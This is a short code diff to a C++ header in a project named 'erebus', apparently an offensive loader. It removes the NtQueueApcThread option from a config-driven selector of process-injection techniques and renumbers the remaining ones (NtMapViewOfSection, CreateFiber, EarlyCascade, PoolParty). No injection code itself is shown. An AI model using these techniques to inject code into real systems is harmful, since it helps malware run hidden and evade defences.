@@ -8,14 +8,12 @@ namespace erebus {
 	inline typeInjectionMethod GetInjectionMethod()
 	{
 	#if CONFIG_INJECTION_TYPE == 1
-		return &InjectionNtQueueApcThread;
-	#elif CONFIG_INJECTION_TYPE == 2
 		return &InjectionNtMapViewOfSection;
-	#elif CONFIG_INJECTION_TYPE == 3
+	#elif CONFIG_INJECTION_TYPE == 2
 		return &InjectionCreateFiber;
-	#elif CONFIG_INJECTION_TYPE == 4
+	#elif CONFIG_INJECTION_TYPE == 3
 		return &InjectionEarlyCascade;
-	#elif CONFIG_INJECTION_TYPE == 5
+	#elif CONFIG_INJECTION_TYPE == 4
 		return &InjectionPoolParty;
 	#else
 		return nullptr;
